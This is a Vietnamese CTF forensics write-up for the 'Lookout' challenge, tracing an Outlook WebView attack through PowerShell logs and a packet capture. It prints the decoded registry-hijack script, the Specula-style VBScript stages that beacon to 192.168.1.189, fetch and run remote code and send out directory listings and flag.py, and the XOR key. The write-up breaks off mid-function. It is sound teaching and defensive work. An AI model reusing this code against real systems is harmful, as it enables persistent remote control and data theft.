# Lookout

<img width="799" height="332" alt="image" src="https://github.com/user-attachments/assets/335e9d8d-c89f-4328-bdd1-aa19efa7464a" />

**Link challenge:** https://drive.google.com/file/d/157ASQE5F0U9-Br_XdEunGBNCBk45vwQC/view

**Description: While checking a monthly report sent by one of my employees, everything seemed ordinary. However, when I logged back in my mailbox the next day, something strange was happening on my computer**

Des của bài nói rằng là sau khi check những report thường xuyên mỗi tháng từ 1 nhân viên, trông thì nó rất bình thường. Nhưng cho đến khi victim đăng nhập trở lại vào `mailbox` thì lại thấy có những điều lạ xuất hiện trong máy tính của người dùng này, và mình sẽ được cung cấp 1 file disk image. 

Ban đầu mình sẽ thực hiện check qua những file `.lnk` bên trong thư mục `Recent` để xem tất cả các file sus đã từng được thực thi gần đây, thì mình thấy có 1 số file như:

`report.txt`
`Powershell_transcript.COMMANDO...txt` -> mình nghĩ đến việc check log windows powershell
`capture.lnk` -> mình vào desktop thì thấy có 1 file `capture.pcapng`
`flag.py`

Bây giờ mình thực hiện export file `log Powershell Operational` ra để xem các lệnh execute remote được thực thi trên máy của victim:

<img width="1289" height="396" alt="image" src="https://github.com/user-attachments/assets/a1df151f-b64b-4d44-be22-e1eaff0ebe07" />

Đầu tiên vào `1/10/2025 - 8:12:59` - mình có thể thấy được trên máy victim đã thực hiện chạy 1 lệnh powershell để tải về file `report.txt` từ ip: `192.168.1.189`

<img width="1319" height="647" alt="image" src="https://github.com/user-attachments/assets/ee5b1086-e7ce-4f7c-8ce8-2a11e839d1a6" />

Tiếp theo mình thấy trên máy của victim đã thực hiện chạy một lệnh powershell bằng lệnh:
```
Invoke-Command ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JAB0AGUAbQBwAFIAZQBnAEYAaQBsAGUAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAVABlAG0AcABGAGkAbABlAE4AYQBtAGUAKAApACAAKwAgACIALgByAGUAZwAiAA0ACgANAAoAJAByAGUAZwBDAG8AbgB0AGUAbgB0ACAAPQAgAEAAIgANAAoAVwBpAG4AZABvAHcAcwAgAFIAZQBnAGkAcwB0AHIAeQAgAEUAZABpAHQAbwByACAAVgBlAHIAcwBpAG8AbgAgADUALgAwADAADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADYALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADUALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADQALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEUAeAB0AFwAUwB0AGEAdABzAFwAewAyADYAMQBCADgAQwBBADkALQAzAEIAQQBGAC0ANABCAEQAMAAtAEIAMABDADIALQBCAEYAMAA0ADIAOAA2ADcAOAA1AEMANgB9AFwAaQBlAHgAcABsAG8AcgBlAF0ADQAKACIARgBsAGEAZwBzACIAPQBkAHcAbwByAGQAOgAwADAAMAAwADAAMAAwADQADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEkAbgB0AGUAcgBuAGUAdAAgAFMAZQB0AHQAaQBuAGcAcwBcAFoAbwBuAGUAcwBcADIAXQANAAoAIgAxADQAMABDACIAPQBkAHcAbwByAGQAOgAwADAAMAAwADAAMAAwADAADQAKACIAMQAyADAAMAAiAD0AZAB3AG8AcgBkADoAMAAwADAAMAAwADAAMAAwAA0ACgAiADEAMgAwADEAIgA9AGQAdwBvAHIAZAA6ADAAMAAwADAAMAAwADAAMwANAAoAIgBAAA0ACgANAAoAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJAB0AGUAbQBwAFIAZQBnAEYAaQBsAGUAIAAtAFYAYQBsAHUAZQAgACQAcgBlAGcAQwBvAG4AdABlAG4AdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAVQBuAGkAYwBvAGQAZQANAAoAJgAgAHIAZQBnAC4AZQB4AGUAIABpAG0AcABvAHIAdAAgACIAYAAiACQAdABlAG0AcABSAGUAZwBGAGkAbABlAGAAIgAiAA0ACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAHQAZQBtAHAAUgBlAGcARgBpAGwAZQAgAC0ARgBvAHIAYwBlAA0ACgA='))))

```

Script này thực hiện decode cục payload base64 bên trong và deocde text, giờ mình sẽ thực hiện decode nó ra thì có được script sau:

```
$tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"

$regContent = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
"Flags"=dword:00000004

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
"140C"=dword:00000000
"1200"=dword:00000000
"1201"=dword:00000003
"@

Set-Content -Path $tempRegFile -Value $regContent -Encoding Unicode
& reg.exe import "`"$tempRegFile`""
Remove-Item -Path $tempRegFile -Force
```

Script này thực hiện import vào 1 file Registry để cấu hình lại Outlook WebView cho thư mục Inbox trỏ đến server `http://192.168.1.189:8386/plugin/search/`, mỗi khi mà người dùng mở Inbox, thì outlook sẽ tự động load đến máy chủ kia thay vì server Outlook chính chủ từ Microsoft thông thường, đây là 1 kỹ thuật persistence/C2 dựa vào việc thay đổi key trong registry dẫn đến việc đổi target khi load 1 trang web. 

Giờ mình sẽ mở file pcap để tiếp tục xem attacker làm gì sau stage 1, thực hiện persistence thông qua việc thay đổi key bên trong registry. Mình thực hiện filter như sau: `ip.addr == 192.168.1.189`

Sau khi thực hiện download về file report.txt, lúc này victim thực hiện mở Inbox và nó bắt đầu trỏ về server C2 của attacker thông quan packet `GET /plugins/search` trong file `.pcapng`

<img width="1253" height="1036" alt="image" src="https://github.com/user-attachments/assets/c3bb042e-f9b8-4bdc-a8a8-4f1486111247" />

Bên trong này đoạn code html thực hiện stage 2

```
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="refresh" content="10">
<meta http-equiv="Cache-Control" content=NO-CACHE, no-store, must-revalidate, max-age=0" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="EXPIRES" CONTENT="0">
<title>Outlook</title>
<style>
body {
overflow: hidden;
border: 0px;
padding: 0px;
margin: 0px;
}
</style>
<script id=clientEventHandlersVBS language=vbscript>
<!--
On Error Resume Next
Function GetEnvironment()
On Error Resume Next
Set sh = outlookapp.CreateObject("Wscript.Shell")
compname = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
usern = sh.ExpandEnvironmentStrings("%USERNAME%")
r = BaseDecode(compname & "|" & usern,1)
GetEnvironment = r
End Function
Function SetRegKey(subkey,value,valuetype)
On Error Resume Next
Set oL = outlookapp.CreateObject("Wscript.Shell")
ol.RegWrite subkey, value, valuetype
End Function
Function BaseDecode(value, LE)
On Error Resume Next
With outlookapp.CreateObject("Msxml2.DOMDocument").CreateElement("aux")
.DataType = "bin.base64"
if LE then
.NodeTypedValue = StrToBytes(value, "utf-16le", 2)
else
.NodeTypedValue = StrToBytes(value, "utf-8", 3)
end if
BaseDecode = .Text
End With
End Function
Function requestpage(uri, rR)
On Error Resume Next
vi = Left(outlookapp.version,4)
d = rR
set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
oP.open "POST", uri,false
oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
oP.setRequestHeader "Content-Length", Len(d)
oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
oP.setOption 2, 13056
oP.send Replace(d, vbLf, "")
requestpage = oP.responseText
End Function
Function StrToBytes(strn, cset, pos)
On Error Resume Next
With outlookapp.CreateObject("ADODB.Stream")
.Type = 2
.Charset = cset
.Open
.WriteText strn
.Position = 0
.Type = 1
.Position = pos
StrToBytes = .Read
.Close
End With
End function
O = ""
uriloc = "http://192.168.1.189:8386/plugin/search/"
Set outlookapp = window.external.OutlookApplication
Sub window_onload()
O = GetEnvironment()
rul = requestpage(uriloc, chr(34) & O & chr(34))
if not rul = "" Then
Set box = outlookapp.GetNameSpace("MAPI")
Set fold = box.GetDefaultFolder(9)
val1 = SetRegKey("HKCU\" & "Software\Microsoft\Office\"  & Left(outlookapp.version,4) & "\Outlook\UserInfo" & "\" & "KEY", Split(rul,"||")(0), "REG_SZ")
val2 = SetRegKey("HKCU\Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\Webview\Inbox\URL", Split(rul,"||")(1), "REG_SZ")
val3 = SetRegKey("HKCU\Software\Microsoft\Internet Explorer\Styles\MaxScriptStatements", &Hffffffff, "REG_DWORD")
Set outlookapp.ActiveExplorer.CurrentFolder = fold
End if
End Sub
-->
</script>
</head>
<body>
<object classid="CLSID:0006F063-0000-0000-C000-000000000046" id="SpeculaViewID" data="" width="100%" height="100%"></object>
</body>
</html>
```
Trong đoạn html trên các hành vi được thực thi bởi attacker là:

- `<meta http-equiv="refresh" content="10">` - tự động load lại page html 

- `<script id=clientEventHandlersVBS language=vbscript>` - attacker load vbscript dùng để thực thi lệnh từ trong chính page html được load 

```
Function GetEnvironment()
On Error Resume Next
Set sh = outlookapp.CreateObject("Wscript.Shell")
compname = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
usern = sh.ExpandEnvironmentStrings("%USERNAME%")
r = BaseDecode(compname & "|" & usern,1)
GetEnvironment = r
End Function
```
Thực hiện lấy về value từ 2 variable env trong hệ thống của victim là username và computername. 

```
Function requestpage(uri, rR)
On Error Resume Next
vi = Left(outlookapp.version,4)
d = rR
set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
oP.open "POST", uri,false
oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
oP.setRequestHeader "Content-Length", Len(d)
oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
oP.setOption 2, 13056
oP.send Replace(d, vbLf, "")
requestpage = oP.responseText
End Function
```
Script thực hiện request `POST` các thông tin của máy victim về cho server C2.

```
rul = requestpage(uriloc, chr(34) & O & chr(34))
if not rul = "" Then
    val1 = SetRegKey("HKCU\Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\UserInfo\KEY", Split(rul,"||")(0), "REG_SZ")
    val2 = SetRegKey("HKCU\Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\Webview\Inbox\URL", Split(rul,"||")(1), "REG_SZ")
    val3 = SetRegKey("HKCU\Software\Microsoft\Internet Explorer\Styles\MaxScriptStatements", &Hffffffff, "REG_DWORD")
End if
```
Script nhận lại các response từ server sau đó sẽ ghi các value đó vào bên trong các key của registry với format như sau:

```
<KEY>||<NEW_URL>
```

Dùng để ghi vào các key sau bên trong registry:

```
HKCU\Software\Microsoft\Office\16.0\Outlook\UserInfo\KEY  -> Tiếp tục config lại key trong registry để thực hiện thêm các bước attack khác
HKCU\Software\Microsoft\Office\16.0\Outlook\Webview\Inbox\URL -> Set lại url khác để có thể tạo một persistence khác khi url cũ có bị chặn đi
```
Khi tiếp tục dò các stream khác thì mình sẽ thấy victim đã thực hiện request POST lên cho server 1 chuỗi base64 nhỏ:

`QwBPAE0ATQBBAE4ARABPAHwAQgBLAEkAUwBDAA== -> Decode base64 ra thì chúng ta sẽ có được COMMANDO|BKISC <COMPUTERNAME> | <USERNAME>`

Ngoài ra ở packet cuối trong stage 2 này mình sẽ thấy C2 server thực hiện response về 1 key và 1 url sau:

<img width="1139" height="323" alt="image" src="https://github.com/user-attachments/assets/6f683ba0-edd6-433a-b14f-e2ead6481452" />

**Key: o4WlfbKbx1xik1TgTQGeOQ** -> Dùng để decrypt cho stage 3

**http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ** -> url tiếp theo mà máy của victim thực hiện kết nối đến để nhận payload và gửi các thông tin của hệ thống lên server C2

Sau đó mình thấy máy cảu victim thực hiện load tiếp 1 page html từ url mới `http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ`

```
html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Outlook</title>
<style>
body {
overflow: hidden;
border: 0px;
padding: 0px;
margin: 0px;
}
</style>
<script id=clientEventHandlersVBS language=vbscript>
On Error Resume Next

Sub DownloadCacheLogic ()
		Set server_manager = window.external.OutlookApplication.CreateObject("MSXML2.ServerXMLHTTP")
		vr = Left(window.external.OutlookApplication.version,4)
		server_manager.open "GET", "http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ/FxBdmVg", False
		server_manager.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vr
		server_manager.send
		rp = server_manager.ResponseText
        ExecuteGlobal rp
End Sub

Sub window_onload()
DownloadCacheLogic
End Sub
</script>
</head>
<BODY>
<OBJECT CLASSID="CLSID:0006F063-0000-0000-C000-000000000046" id="SpeculaViewID" width=100% height=100%>
```

- Đoạn html này thực hiện mục đích **loader**, nhiệm vụ chính của nó là GET về script ở stage cuối tại url: `http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ/FxBdmVg`, sau đó thực hiện execute bằng lệnh `ExecuteGlobal rp`

- Giờ mình sẽ đem đoạn script ở stage cuối ra, sau khi victim đã tải về nó sẽ thực thi đoạn script này.
```
Set outlookapp = window.external.OutlookApplication
Dim ay
Dim sync


Function requestpage(uri, rR)
	On Error Resume Next
	vi = Left(outlookapp.version,4)
	d = rR
	set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
	oP.open "POST", uri,false
	oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
	oP.setRequestHeader "Content-Length", Len(d)
	oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
	oP.setOption 2, 13056
	oP.send Replace(d, vbLf, "")
	requestpage = oP.responseText
End Function

Sub downloadcode (uri)
        On Error Resume Next
		Set serverapp = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
		vr = Left(outlookapp.version,4)
		serverapp.open "GET", uri, False
		serverapp.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vr
		serverapp.send
		response = serverapp.ResponseText
        f = Left(response, 1)
		j = Int(Mid(response, 2, 4)) * 1000
		If Err.Number <> 0 Then
		    Exit Sub
		End If
		sync = j
		If f = 2 Then
		    Exit Sub
		ElseIf f = 1 Then
            ExecuteGlobal Crypt(Mid(response, 6), ay, False)
		Else
            ExecuteGlobal Mid(response, 6)
		End If
End Sub

Function readreg(path,value)
	On Error Resume Next
	Va = ""
	Set oL = outlookapp.CreateObject("WbemScripting.SWbemLocator")
   Set lr = oL.ConnectServer(".", "root\cimv2").Get("StdRegProv")
	lr.GetStringValue 2147483649, path, value, Va
	readreg = Va
End Function

Function Crypt(input, Key, Mode)
    For i = 1 To Len(input)
        Position = Position + 1
        If Position > Len(Key) Then Position = 1
        keyx = Asc(Mid(Key, Position, 1))
        If Mode Then
            orgx = Asc(Mid(input, i, 1))
            cptx = orgx Xor keyx
            cptString = Hex(cptx)
                        If Len(cptString) < 2 Then cptString = "0" & cptString
                        z = z & cptString
        Else
            If i > Len(input) \ 2 Then Exit For
            cptx = CByte("&H" & Mid(input, i * 2 - 1, 2))
            orgx = cptx Xor keyx
            z = z & Chr(orgx)
        End If
    Next
    Crypt = z
End Function

Function crypthelper(input, key, mode)
	l = Len(input)
	Dim j
	If mode Then
		ReDim j(l * 2)
	Else
		ReDim j(l / 2)
	End If
    For i = 1 To l
        Position = Position + 1
        If Position > Len(key) Then Position = 1
        kZ = Asc(Mid(key, Position, 1))
        If mode Then
            orZ = Asc(Mid(input, i, 1))
            cpt = orZ Xor kZ
            cptString = Hex(cpt)
			If Len(cptString) < 2 Then cptString = "0" & cptString
			j(i) = cptString
        Else
            If i > Len(input) \ 2 Then Exit For
            cpt = CByte("&H" & Mid(input, i * 2 - 1, 2))
            orZ = cpt Xor kZ
            j(i) = Chr(orZ)
        End If
    Next
    crypthelper = Join(j, "")
End Function

Function update_subscription()
    aluceps_coi = Int((2200 - 201 + 1) * Rnd + 0)
    if aluceps_coi = 1194 then
        Set ws = window.external.OutlookApplication.CreateObject("Wscript.shell")
        c = "cmd /c start https://github.com/trustedsec/specula/wiki/Why-am-I-seeing-this%3F"
	    ws.Run c, 0, true
    end if

    downloadcode "http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ/rUe38nIs"
    window.setTimeout "update_subscription", sync, "VBScript"
End Function


oldstr = ""
sync = 10 * 1000
ay = readreg("Software\Microsoft\Office\"  & Left(outlookapp.version,4) & "\Outlook\UserInfo", "KEY")
window.setTimeout "update_subscription", sync, "VBScript"
```

Đây là đoạn script ở stage cuối, mình sẽ phân tích qua các hành vi trong này:

```
Function requestpage(uri, rR)
	On Error Resume Next
	vi = Left(outlookapp.version,4)
	d = rR
	set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
	oP.open "POST", uri,false
	oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
	oP.setRequestHeader "Content-Length", Len(d)
	oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
	oP.setOption 2, 13056
	oP.send Replace(d, vbLf, "")
	requestpage = oP.responseText
End Function
```

Đầu tiên hàm này thực hiện chức năng tạo các request `POST`, để up các thông tin của hệ thống lên server C2.

```
Sub downloadcode (uri)
    Set serverapp = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
    serverapp.open "GET", uri, False
    serverapp.setRequestHeader "User-Agent", "... Specula; Microsoft Outlook " & vr
    serverapp.send
    response = serverapp.ResponseText

    f = Left(response, 1)
    j = Int(Mid(response, 2, 4)) * 1000

    sync = j

    If f = 2 Then
        Exit Sub
    ElseIf f = 1 Then
        ExecuteGlobal Crypt(Mid(response, 6), ay, False)
    Else
        ExecuteGlobal Mid(response, 6)
    End If
End Sub
```

Tiếp theo hàm này sẽ thực hiện lấy lệnh từ server C2, và thực thi. Các lệnh của server C2 sẽ có format như sau:

```
[f][gồm 4 số][payload]

Nếu f = 2 -> cook

Nếu f = 1 thì thực thi hàm Crypt() -> Hàm này sẽ thực thi việc decrypt cục payload từ server để thực thi'

Nếu f = another -> trả về payload không mã hóa, script sẽ thực thi, phần phía sau 5 kí tự đầu 
```

Sau đó là hàm `Crypt()` thực hiện xor lặp key, nếu thỏa điều kiện f = 1 nó sẽ đưa vào mode decrypt bằng key lặp, với key là biến `ay -> ở cuối script` lấy giá trị từ key được response từ server từ stage 2. Sau đó các packet phía sau trong stream của stage 2, server sẽ gửi payload cho victim và yêu cầu nó thực hiện dựa vào response của server mà thực thi:

Cuối cùng là hàm `update_subscription()` chức năng chính là thực hiện:

- Request GET đến url `/css/dx7u7QYCSlbTbQ/rUe38nIs`
- Tải về script bằng lệnh `downloadcode`
- Và thực hiện execute bằng lệnh `ws.Run`


<img width="1913" height="946" alt="image" src="https://github.com/user-attachments/assets/2ed3fb16-c728-4842-842a-3df15fb6091a" />

Giờ mình sẽ dùng cyberchef với các recipe là:

- From hex

- Xor với key: o4WlfbKbx1xik1TgTQGeOQ

- Decode text 

Đầu tiên chuỗi hex mà victim thực hiện post lên cho server C2 các Users bên trong hệ thống:

```
Parent Folder: C:/Users
F: C:\Users\desktop.ini
D: C:\Users\All Users
D: C:\Users\BKISC
D: C:\Users\Default
D: C:\Users\Default User
D: C:\Users\Public
```

Lúc này chúng ta sẽ thấy victim thực hiện request GET đến cho url `/css/dx7u7QYCSlbTbQ/rUe38nIs`, để nhận 1 cục payload đã bị decrypt:

<img width="1256" height="866" alt="image" src="https://github.com/user-attachments/assets/05504638-b145-4a1a-b8c9-49c1e6990bde" />

Khi thực hiện decrypt ra thì mình sẽ có được 1 script sau:

```
Function dir_lister(folderpath, depth, recurselevels, filetype, filename, nodirectories, sizeformat, nofiles)
	On error resume next
    Set fs = window.external.OutlookApplication.CreateObject("Scripting.FileSystemObject")
	contents = ""
    
	if sizeformat = "kb" Then
		sizeround = 1024
	elseif sizeformat = "mb" Then
		sizeround = 1048576
	elseif sizeformat = "gb" Then
		sizeround = 1073741824
	elseif sizeformat = "tb" Then
		sizeround = 1099511627776
	end if

    if fs.FolderExists(folderpath) Then
		Set objFolder = fs.GetFolder(folderpath)
		if not nofiles Then
			if depth <= recurselevels Then
				Set colFiles = objFolder.Files
				For Each objFile in colFiles
					friendlysize = Round(objfile.Size / sizeround, 1)
					if filetype = "*" Then
						if filename = "*" Then
							contents = contents & "F: " & objFile.Path & " - Size: " & friendlysize & sizeformat & " - LastModified: " & objFile.DateLastModified & vbCrLf
						else
							If LCase(fs.GetBaseName(objFile.Name)) = LCase(filename) Then
								contents = contents & "F: " & objFile.Path & " - Size: " & friendlysize & sizeformat & " - LastModified: " & objFile.DateLastModified & vbCrLf
							end if
						end if
					else
						If LCase(fs.GetExtensionName(objFile.Name)) = LCase(filetype) Then
							if filename = "*" Then
								contents = contents & "F: " & objFile.Path & " - Size: " & friendlysize & sizeformat & " - LastModified: " & objFile.DateLastModified & vbCrLf
							else
								If LCase(fs.GetBaseName(objFile.Name)) = LCase(filename) Then
									contents = contents & "F: " & objFile.Path & " - Size: " & friendlysize & sizeformat & " - LastModified: " & objFile.DateLastModified & vbCrLf
								end if
							end if
						End If
					End If
					If Err.Number <> 0 Then
						if nodirectories Then
						Else
							contents = contents & "ERROR - Read Files denied on path - " & folderpath  & vbCrLf
							return
							Err.Clear
						end if
					End If
				Next
			end if
		end if
		For Each Subfolder in objFolder.SubFolders
			if depth > recurselevels Then
				exit For
			else
				if nodirectories Then
				Else
					contents = contents & "D: " & Subfolder.Path & " - LastModified: " & Subfolder.DateLastModified & vbCrLf
				End if
				contents = contents & dir_lister(Subfolder.Path, depth+1, recurselevels, filetype, filename, nodirectories, sizeformat, nofiles)
			End if
        Next
        if depth = 0 Then
            dir_lister = "Parent Folder: " & folderpath & vbCrLf & contents
        else
            dir_lister = contents
        End if
    else
        dir_lister = "Folder " & folderpath & " does not exist"
    End If
End Function
Function list_dir()
	On error resume next
    list_dir = dir_lister("C:/Users/BKISC", 0, 0, "*", "*", False, "mb", False)
End Function
Ohm = ""
Ohm = crypthelper(list_dir(), ay, True)
rul = requestpage("http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ", chr(34) & Ohm & chr(34))
```
Script này thực hiện dir ra toàn bộ folder và file bên trong thư mục `C:\Users\BKISC` sau đó thực hiện mã hóa bằng key `ay` sau đó sẽ thực hiện request POST về cho server C2 từ máy của victim:

<img width="3070" height="1739" alt="image" src="https://github.com/user-attachments/assets/6033e3ae-6943-44bc-8481-e5891c5df354" />

Tiếp theo là victim tiếp tục thực hiện request GET đến cho server `/css/dx7u7QYCSlbTbQ/rUe38nIs`, dir ra toàn bộ file bên trong thư mục desktop sau đó, encrypt và gửi về cho server:

```

Function dir_lister(folderpath, depth, recurselevels, filetype, filename, nodirectories, sizeformat, nofiles)
	On error resume next
    Set fs = window.external.OutlookApplication.CreateObject("Scripting.FileSystemObject")
	contents = ""
    
	if sizeformat = "kb" Then
		sizeround = 1024
	elseif sizeformat = "mb" Then
		sizeround = 1048576
	elseif sizeformat = "gb" Then
		sizeround = 1073741824
	elseif sizeformat = "tb" Then
		sizeround = 1099511627776
	end if

    if fs.FolderExists(folderpath) Then
		Set objFolder = fs.GetFolder(folderpath)
		if not nofiles Then
			if depth <= recurselevels Then
				Set colFiles = objFolder.Files
				For Each objFile in colFiles
					friendlysize = Round(objfile.Size / sizeround, 1)
					if filetype = "*" Then
						if filename = "*" Then
							contents = contents & "F: " & objFile.Path & " - Size: " & friendlysize & sizeformat & " - LastModified: " & objFile.DateLastModified & vbCrLf
						else
							If LCase(fs.GetBaseName(objFile.Name)) = LCase(filename) Then
								contents = contents & "F: " & objFile.Path & " - Size: " & friendlysize & sizeformat & " - LastModified: " & objFile.DateLastModified & vbCrLf
							end if
						end if
					else
						If LCase(fs.GetExtensionName(objFile.Name)) = LCase(filetype) Then
							if filename = "*" Then
								contents = contents & "F: " & objFile.Path & " - Size: " & friendlysize & sizeformat & " - LastModified: " & objFile.DateLastModified & vbCrLf
							else
								If LCase(fs.GetBaseName(objFile.Name)) = LCase(filename) Then
									contents = contents & "F: " & objFile.Path & " - Size: " & friendlysize & sizeformat & " - LastModified: " & objFile.DateLastModified & vbCrLf
								end if
							end if
						End If
					End If
					If Err.Number <> 0 Then
						if nodirectories Then
						Else
							contents = contents & "ERROR - Read Files denied on path - " & folderpath  & vbCrLf
							return
							Err.Clear
						end if
					End If
				Next
			end if
		end if
		For Each Subfolder in objFolder.SubFolders
			if depth > recurselevels Then
				exit For
			else
				if nodirectories Then
				Else
					contents = contents & "D: " & Subfolder.Path & " - LastModified: " & Subfolder.DateLastModified & vbCrLf
				End if
				contents = contents & dir_lister(Subfolder.Path, depth+1, recurselevels, filetype, filename, nodirectories, sizeformat, nofiles)
			End if
        Next
        if depth = 0 Then
            dir_lister = "Parent Folder: " & folderpath & vbCrLf & contents
        else
            dir_lister = contents
        End if
    else
        dir_lister = "Folder " & folderpath & " does not exist"
    End If
End Function
Function list_dir()
	On error resume next
    list_dir = dir_lister("C:/Users/BKISC/Desktop", 0, 0, "*", "*", False, "mb", False)
End Function
Ohm = ""
Ohm = crypthelper(list_dir(), ay, True)
rul = requestpage("http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ", chr(34) & Ohm & chr(34))
```
<img width="1922" height="1184" alt="image" src="https://github.com/user-attachments/assets/be5db263-4176-4806-8a3b-c1d2b970ba57" />

Tiếp theo là victim tiếp tục GET về script thực hiện tải về file `flag.py`, sau đó là thực hiện xóa file `flag.py`

```
Function download_file()
	On Error Resume Next
	Set fs = window.external.OutlookApplication.CreateObject("Scripting.FileSystemObject")
	Set file = fs.GetFile("C:\Users\BKISC\Desktop\flag.py")
	if IsNull(file) Then Exit Function
	    With file.OpenAsTextStream()
	    .Skip(0)
        readBinary = .Read(684)
        .Close
    End With
    download_file = readBinary
End Function
Ohm = ""
Ohm = crypthelper(download_file(), ay, True)
rul = requestpage("http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ", chr(34) & Ohm & chr(34))

-> Lúc này nhận được file flag.py ở server, sau đó victim nhận request GET 1 script xóa file flag.py

Function delete_file()
